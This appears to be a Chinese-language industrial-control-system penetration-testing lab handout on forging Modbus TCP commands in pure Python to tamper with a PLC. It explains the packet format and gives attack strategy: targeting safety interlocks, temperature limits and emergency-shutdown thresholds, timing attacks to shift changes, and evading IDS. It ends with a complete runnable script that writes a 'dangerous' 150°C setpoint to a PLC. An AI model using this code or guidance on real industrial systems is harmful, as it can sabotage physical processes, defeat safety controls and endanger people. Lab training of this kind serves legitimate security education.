# LAB 5 - 竄改（直接偽造新指令，純 Python）

## 滲透場景

經過前三個 Lab 的學習，你已經掌握了 Modbus 基本操作、ARP Spoofing 技術，以及流量分析技能。現在進入最高階的攻擊階段：**完全自主的協議操控**。

在這個場景中，你發現目標 PLC 執行了未知的客製化 Modbus 實作，現有的函式庫無法正常工作，或者你需要進行更精細的攻擊操控。此時，你必須拋開所有現成工具，使用純 Python 從底層直接建構和發送 Modbus TCP 封包。

這種攻擊手法讓你能夠：
- 繞過函式庫的限制和檢查機制
- 發送畸形或非標準的 Modbus 指令
- 實現更隱蔽和客製化的攻擊載荷

## Modbus TCP 封包格式深入解析

要手工建構 Modbus 封包，必須完全理解每個位元組的意義：

### MBAP Header（Modbus Application Protocol Header）
| 偏移量 | 欄位名稱 | 長度 | 說明 | 範例值 |
|--------|----------|------|------|--------|
| 0-1 | **Transaction ID** | 2 bytes | 交易識別碼（大端序） | `\x00\x01` |
| 2-3 | **Protocol ID** | 2 bytes | 協議識別碼（固定 0） | `\x00\x00` |
| 4-5 | **Length** | 2 bytes | 後續資料長度 | `\x00\x06` |
| 6 | **Unit ID** | 1 byte | 設備識別碼 | `\x01` |

### PDU（Protocol Data Unit）
| 偏移量 | 欄位名稱 | 長度 | 說明 | 範例值 |
|--------|----------|------|------|--------|
| 7 | **Function Code** | 1 byte | 功能碼 | `\x03` |
| 8+ | **Data** | 變長 | 功能相關資料 | 依功能而定 |

## 純 Python Socket 程式設計

### TCP 連線建立原理
在不使用任何 Modbus 函式庫的情況下，我們必須直接使用 Python 的 socket 模組建立最原始的網路連線。這種方法讓攻擊者擁有完全的控制權，可以發送任何自訂的位元組序列：

```python
import socket
import struct

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('192.168.56.1', 502))
```

### 位元組序列建構技術
Modbus TCP 封包本質上就是一串特定格式的位元組。透過 Python 的 struct 模組，我們可以將整數、字串等資料類型轉換為網路傳輸所需的二進制格式。大端序（Big-Endian）是 Modbus 協議的標準位元組順序：

```python
# 建構 MBAP Header (7 bytes)
header = struct.pack('>HHHB', transaction_id, 0, length, unit_id)
```

### Function Code 3 封包建構
讀取 Holding Registers 的封包結構相對簡單，包含起始位址和讀取數量兩個參數。理解這個基礎結構是進行更複雜攻擊的關鍵：

```python
# PDU: Function Code + Start Address + Count
pdu = struct.pack('>BHH', 0x03, start_addr, count)
complete_packet = mbap_header + pdu
```

### 複雜寫入指令建構
Function Code 16（批量寫入）是最複雜的 Modbus 指令之一，需要精確計算位元組數量和正確的資料封裝。這種指令在攻擊中特別有用，因為可以一次修改多個關鍵參數：

```python
# 計算並建構批量寫入指令
byte_count = len(values) * 2
pdu = struct.pack('>BHHB', 0x10, start_addr, len(values), byte_count)
```

## 進階攻擊技術

### 協議漏洞利用原理
許多工控設備的 Modbus 實作存在安全漏洞，例如對於異常大的資料長度、無效的 Function Code、或者惡意建構的封包缺乏適當的驗證。攻擊者可以利用這些弱點進行：

**Buffer Overflow 攻擊：**
發送超長的資料段可能導致目標設備的緩衝區溢位，進而執行任意程式碼或造成設備當機。

**Protocol Fuzzing：**
系統性地發送各種畸形封包來測試設備的健壯性，尋找可能的安全漏洞。

**Denial of Service：**
透過發送大量惡意封包或特殊建構的指令來癱瘓目標設備。

### 隱蔽性攻擊策略
純 Python 實作的另一個優勢是可以實現極其隱蔽的攻擊：

**時間間隔控制：**
在正常的工業環境中，Modbus 通訊通常有固定的週期。攻擊者可以模擬這種正常的通訊模式，讓惡意操作隱藏在合法流量中。

**參數微調攻擊：**
與其進行明顯的破壞性攻擊，攻擊者可能選擇微幅調整製程參數，造成產品品質下降或設備緩慢劣化，這種攻擊更難被察覺。

**回應封包偽造：**
在中間人攻擊場景中，攻擊者可以攔截正常的 Modbus 查詢，並回傳偽造的回應數據，讓操作人員看到虛假的設備狀態。

## 回應解析與異常處理

### 協議回應結構分析
Modbus 設備的回應封包包含豐富的狀態資訊。正確解析這些資訊不僅能驗證攻擊是否成功，還能為進一步的攻擊提供情報：

**正常回應特徵：**
- Function Code 與請求相同
- 資料長度符合預期
- Transaction ID 正確對應

**異常回應識別：**
當 PLC 檢測到無效的請求時，會回傳異常回應。Function Code 的最高位元會被設為 1，並附帶具體的錯誤代碼。理解這些錯誤代碼有助於調整攻擊策略。

### 錯誤代碼深度分析
不同的 Modbus 異常代碼透露了目標系統的不同資訊：

| 異常代碼 | 含義 | 攻擊價值 |
|---------|------|----------|
| **0x01** | Illegal Function | 發現不支援的功能 |
| **0x02** | Illegal Data Address | 探測到有效的位址範圍 |
| **0x03** | Illegal Data Value | 了解數值的有效範圍 |
| **0x04** | Slave Device Failure | 可能的拒絕服務攻擊成功 |

### 網路層異常處理
在進行底層 socket 操作時，必須妥善處理各種網路異常狀況：

**連線超時：**
可能表示目標設備過載、網路壅塞，或者攻擊被防火牆阻擋。

**連線重置：**
設備可能檢測到異常流量並主動中斷連線，這是一種基本的防護機制。

**部分資料接收：**
在某些情況下，回應封包可能被分割傳輸，需要實作適當的重組邏輯。

## 攻擊效果最大化策略

### 目標參數識別
在工控環境中，不同的暫存器位址對應不同的控制參數。攻擊者需要透過系統性的探測來識別最關鍵的目標：

**安全關鍵參數：**
- 溫度、壓力上限設定
- 安全聯鎖開關狀態
- 緊急停機閾值

**生產影響參數：**
- 製程控制變數
- 產品品質設定
- 生產效率參數

### 攻擊時機選擇
純 Python 實作讓攻擊者能夠精確控制攻擊的時機和頻率：

**系統脆弱時期：**
- 設備啟動或關機程序中
- 操作人員交班時間
- 系統維護窗口期間

**掩護性攻擊：**
在正常的生產活動掩護下進行攻擊，降低被發現的機率。

## 防禦規避技術

### 流量特徵偽裝
現代的 IDS/IPS 系統可能會監控 Modbus 流量的異常模式。攻擊者可以透過以下技術來規避檢測：

**正常化流量模擬：**
分析合法 HMI 系統的通訊模式，模擬其 Transaction ID 序列、請求頻率和資料模式。

**分散式攻擊：**
將攻擊分散到多個時間點和不同的 Unit ID，避免觸發基於頻率的異常檢測。

### 協議層混淆
利用 Modbus 協議的一些模糊規範來實現攻擊載荷的混淆：

**保留位元利用：**
在某些保留的位元位置插入無害的資料，可能繞過簡單的模式匹配檢測。

**冗餘資料插入：**
在不影響核心功能的前提下，添加額外的資料來改變封包的特徵簽章。

## 滲透價值分析

使用純 Python 建構 Modbus 封包的優勢：

- **完全控制**：對每個位元組都有絕對控制權
- **繞過限制**：不受函式庫功能限制
- **客製化攻擊**：可實作特殊的攻擊載荷
- **深度理解**：強迫學習協議底層結構

這種技術在高階滲透測試和漏洞研究中極為重要。

## 完整程式碼範例

以下是完整的純 Python Modbus 攻擊程式，展示所有關鍵技術的整合應用：

```python
#!/usr/bin/env python3
import socket
import struct
import time

class PureModbusAttacker:
    def __init__(self, host, port=502):
        self.host = host
        self.port = port
        self.sock = None
        self.transaction_id = 1
    
    def connect(self):
        """建立 TCP 連線"""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((self.host, self.port))
        print(f"[+] 連線成功: {self.host}:{self.port}")
    
    def build_read_packet(self, start_addr, count, unit_id=1):
        """建構讀取封包"""
        # MBAP Header + Function Code 3 + Address + Count
        packet = struct.pack('>HHHBBHH', 
                           self.transaction_id, 0, 6, unit_id,
                           0x03, start_addr, count)
        self.transaction_id += 1
        return packet
    
    def build_write_packet(self, address, value, unit_id=1):
        """建構寫入封包"""
        packet = struct.pack('>HHHBBHH',
                           self.transaction_id, 0, 6, unit_id,
                           0x06, address, value)
        self.transaction_id += 1
        return packet
    
    def execute_attack(self):
        """執行完整攻擊序列"""
        # 讀取當前狀態
        read_packet = self.build_read_packet(0, 4)
        self.sock.send(read_packet)
        response = self.sock.recv(1024)
        
        # 寫入危險數值
        write_packet = self.build_write_packet(0, 1500)  # 150°C
        self.sock.send(write_packet)
        self.sock.recv(1024)
        
        print("[+] 攻擊執行完成")

def main():
    attacker = PureModbusAttacker('192.168.56.1')
    attacker.connect()
    attacker.execute_attack()

if __name__ == "__main__":
    main()
```

將以上程式碼儲存為 `pure_modbus_attack.py`，然後執行：
```bash
python3 pure_modbus_attack.py
```

## 答題區